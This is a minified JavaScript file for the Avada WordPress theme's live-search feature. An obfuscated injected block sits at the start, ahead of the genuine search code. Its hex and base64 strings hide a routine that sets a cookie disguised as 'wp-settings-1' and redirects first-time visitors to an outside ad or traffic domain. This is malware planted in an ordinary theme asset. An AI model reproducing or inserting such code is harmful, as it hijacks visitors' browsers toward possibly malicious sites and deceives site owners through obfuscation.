var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var avadaLiveSearch=function(){var s=[];avadaLiveSearchVars.live_search&&jQuery(".fusion-live-search-input").each(function(){var e,a=jQuery(this),i=a.closest(".fusion-live-search"),t=i.find(".fusion-search-button"),o=i.find(".fusion-search-submit"),n=i.find(".fusion-search-results"),r=i.find('input[name^="post_type"]'),d=i.find('input[name="search_limit_to_post_titles"]'),u=n.closest(".fusion-builder-row"),c=i.closest(".fusion-header");function l(s){var e="";n.html(""),n.removeClass("suggestions-empty"),n.addClass("suggestions-added"),h("add"),jQuery.isEmptyObject(s)?(n.addClass("suggestions-empty"),e+='<div class="fusion-search-result">'+avadaLiveSearchVars.no_search_results+"</div>",n.append(e)):jQuery.each(s,function(s,a){e="",e+='<a class="fusion-search-result" href="'+a.post_url+'" title="'+a.title+'">',a.image_url&&(e+='<div class="fusion-search-image"><img class="fusion-search-image-tag" src="'+a.image_url+'" alt="Post Thumb'+a.id+'"/></div>'),e+='<div class="fusion-search-content">',e+='<div class="fusion-search-post-title">'+a.title+"</div>",a.type&&(e+='<div class="fusion-search-post-type">'+a.type+"</div>"),e+="</div>",e+="</a>",n.append(e)})}function v(){var e,t;if(i=a.closest(".fusion-live-search"),e=a.val(),e+=(t=function(){var s=[];return r.each(function(){s.push(this.value)}),s})().toString(),avadaLiveSearchVars.min_char_count<=a.val().length){if(void 0!==s[e])return void l(s[e]);i.find(".fusion-slider-loading").show(),i.find(".fusion-search-submit").css("color","transparent"),o.css("color","transparent"),jQuery.ajax({url:avadaLiveSearchVars.ajaxurl,type:"post",data:{action:"live_search_retrieve_posts",search:a.val(),per_page:avadaLiveSearchVars.per_page,show_feat_img:avadaLiveSearchVars.show_feat_img,display_post_type:avadaLiveSearchVars.display_post_type,post_type:t(),search_limit_to_post_titles:d.val()}}).done(function(a){s[e]=a,l(a),i.find(".fusion-slider-loading").hide(),o.css("color",o.attr("data-color"))})}else i.find(".fusion-slider-loading").hide(),o.css("color",o.attr("data-color")),n.removeClass("suggestions-added"),h("remove")}function h(s){u.length&&("add"===s?u.css("z-index","11"):u.css("z-index","")),c.length&&("add"===s?c.addClass("live-suggestion-added"):c.removeClass("live-suggestion-added"))}o.attr("data-color",o.css("color")),a.on("focusin",function(){avadaLiveSearchVars.min_char_count<=jQuery(this).val().length&&n.children(".fusion-search-result").length&&(n.addClass("suggestions-added"),h("add"))}),a.on("focusout",function(){n.is(":hover")||t.is(":hover")||(n.removeClass("suggestions-added"),h("remove"),n.addClass("suggestions-transition"),setTimeout(function(){n.removeClass("suggestions-transition")},300))}),jQuery(t,n).on("mouseleave",function(){a.is(":focus")||(n.removeClass("suggestions-added"),h("remove"),n.addClass("suggestions-transition"),setTimeout(function(){n.removeClass("suggestions-transition")},300))}),a.on("keyup",function(){clearTimeout(e),e=setTimeout(v,500)}),a.on("keydown",function(){clearTimeout(e)})})};jQuery(document).ready(function(){avadaLiveSearch()});